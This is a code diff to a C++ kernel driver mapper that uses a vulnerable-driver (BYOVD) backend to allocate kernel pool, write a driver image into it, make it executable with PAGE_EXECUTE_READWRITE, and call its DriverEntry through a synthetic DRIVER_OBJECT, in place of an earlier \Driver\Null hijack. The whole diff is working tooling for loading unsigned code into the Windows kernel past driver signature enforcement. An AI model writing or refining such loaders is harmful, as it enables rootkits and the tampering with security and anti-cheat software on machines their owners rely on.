@@ -274,11 +274,13 @@ MappingResult MapDriverBytes(byovd::IByovdBackend* backend, const std::vector<ui
     std::cout << "[hinv::mapper] Image size: " << imageSize << " bytes, preferred base: 0x"
               << std::hex << nt->OptionalHeader.ImageBase << std::dec << "\n";
 
+    kmem::Trace("mapper: allocate begin");
     uint64_t kernelBase = 0;
     if (!kmem::AllocateKernelMemory(backend, imageSize, kernelBase) || !kernelBase) {
         result.error = "kernel allocation failed";
         return result;
     }
+    kmem::Trace("mapper: allocate ok");
     std::cout << "[hinv::mapper] Allocated kernel memory at 0x" << std::hex << kernelBase << std::dec << "\n";
 
     std::vector<uint8_t> mapped;
@@ -300,85 +302,63 @@ MappingResult MapDriverBytes(byovd::IByovdBackend* backend, const std::vector<ui
         }
     }
     std::cout << "[hinv::mapper] Wrote " << mapped.size() << " bytes to kernel memory\n";
+    kmem::Trace("mapper: image written");
 
     // Locate DriverEntry RVA.
     uint32_t entryRva = nt->OptionalHeader.AddressOfEntryPoint;
     uint64_t driverEntryVa = kernelBase + entryRva;
 
-    // Hijack \\Driver\\Null DriverObject.
-    uint64_t nullObject = kmem::GetDriverObject(backend, L"\\Driver\\Null");
-    if (!nullObject) {
-        result.error = "failed to obtain \\Driver\\Null object";
+    // Pool memory is NX since Windows 8; flip the whole image to RWX before
+    // calling into it (kdmapper applies per-section protections the same way,
+    // via MmSetPageProtection).
+    kmem::Trace("mapper: protect begin");
+    if (!kmem::ProtectKernelMemory(backend, kernelBase, imageSize, PAGE_EXECUTE_READWRITE)) {
+        result.error = "failed to make mapped image executable";
         result.imageBase = kernelBase;
         kmem::FreeKernelMemory(backend, kernelBase);
         return result;
     }
-    std::cout << "[hinv::mapper] Hijacked \\Driver\\Null object at 0x" << std::hex << nullObject << std::dec << "\n";
+    kmem::Trace("mapper: protect ok");
 
-    // Patch \\Driver\\Null DriverObject so it describes the mapped image.
+    // Minimal synthetic DRIVER_OBJECT in kernel pool (no \Driver\Null hijack):
+    // only DriverStart/DriverSize are populated, matching kdmapper's approach.
     // DRIVER_OBJECT (x64): DriverStart @ 0x18, DriverSize @ 0x20.
-    constexpr uint64_t OFF_DRIVER_START = 0x18;
-    constexpr uint64_t OFF_DRIVER_SIZE = 0x20;
-    uint64_t origStart = 0;
-    uint32_t origSize = 0;
-    if (!kmem::ReadU64(backend, nullObject + OFF_DRIVER_START, origStart) ||
-        !kmem::ReadU32(backend, nullObject + OFF_DRIVER_SIZE, origSize)) {
-        result.error = "failed to read original DriverObject fields";
+    kmem::Trace("mapper: drvobj alloc begin");
+    constexpr size_t DRV_OBJ_SIZE = 0x200;
+    uint64_t drvObj = 0;
+    if (!kmem::AllocateKernelMemory(backend, DRV_OBJ_SIZE, drvObj) || !drvObj) {
+        result.error = "failed to allocate synthetic DRIVER_OBJECT";
         result.imageBase = kernelBase;
-        kmem::DereferenceObject(backend, nullObject);
         kmem::FreeKernelMemory(backend, kernelBase);
         return result;
     }
-    bool startWritten = false;
-    bool sizeWritten = false;
-    if (kmem::WriteU64(backend, nullObject + OFF_DRIVER_START, kernelBase)) {
-        startWritten = true;
-    }
-    if (kmem::WriteU32(backend, nullObject + OFF_DRIVER_SIZE, imageSize)) {
-        sizeWritten = true;
-    }
-
-    if (!startWritten || !sizeWritten) {
-        result.error = "failed to patch DriverObject fields";
-        result.imageBase = kernelBase;
-        // Restore whatever was written. If a restore fails the object still
-        // references our pool, so the pool must NOT be freed.
-        bool rollbackOk = true;
-        if (startWritten && !kmem::WriteU64(backend, nullObject + OFF_DRIVER_START, origStart)) rollbackOk = false;
-        if (sizeWritten && !kmem::WriteU32(backend, nullObject + OFF_DRIVER_SIZE, origSize)) rollbackOk = false;
-        if (!rollbackOk) result.error += "; rollback failed, mapped pool left allocated to avoid dangling pointers";
-        kmem::DereferenceObject(backend, nullObject);
-        if (rollbackOk) {
+    {
+        std::vector<uint8_t> zeros(DRV_OBJ_SIZE, 0);
+        if (!backend->WriteKernelMemory(drvObj, zeros.data(), zeros.size()) ||
+            !kmem::WriteU64(backend, drvObj + 0x18, kernelBase) ||
+            !kmem::WriteU32(backend, drvObj + 0x20, imageSize)) {
+            result.error = "failed to initialize synthetic DRIVER_OBJECT";
+            result.imageBase = kernelBase;
+            kmem::FreeKernelMemory(backend, drvObj);
             kmem::FreeKernelMemory(backend, kernelBase);
-            result.imageBase = 0;
+            return result;
         }
-        return result;
     }
 
     // Call DriverEntry(DriverObject, RegistryPath = NULL).
-    uint32_t status = kmem::CallDriverEntry(backend, driverEntryVa, nullObject, 0);
+    kmem::Trace("mapper: driverentry call begin");
+    uint32_t status = kmem::CallDriverEntry(backend, driverEntryVa, drvObj, 0);
+    kmem::Trace("mapper: driverentry returned");
     std::cout << "[hinv::mapper] DriverEntry returned 0x" << std::hex << status << std::dec << "\n";
 
-    // Restore original fields to keep \\Driver\\Null consistent. Restore
-    // failures are real failures: while the object still points at our pool,
-    // freeing the pool would leave a dangling kernel pointer.
-    bool restoreStartOk = kmem::WriteU64(backend, nullObject + OFF_DRIVER_START, origStart);
-    bool restoreSizeOk = kmem::WriteU32(backend, nullObject + OFF_DRIVER_SIZE, origSize);
-    bool restored = restoreStartOk && restoreSizeOk;
-
-    // Drop the reference we took with ObReferenceObjectByName.
-    kmem::DereferenceObject(backend, nullObject);
+    // The synthetic object is ours; the mapped image stays resident on success.
+    kmem::FreeKernelMemory(backend, drvObj);
+    kmem::Trace("mapper: drvobj freed");
 
     result.imageBase = kernelBase;
-    result.driverObject = nullObject;
+    result.driverObject = 0; // synthetic object already freed; nothing borrowed
     result.driverEntryStatus = status;
     result.imageSize = imageSize;
-
-    if (!restored) {
-        result.success = false;
-        result.error = "failed to restore \\Driver\\Null DriverObject; mapped pool left allocated to avoid dangling pointers";
-        return result;
-    }
 
     result.success = (status == 0); // STATUS_SUCCESS
     if (!result.success) {
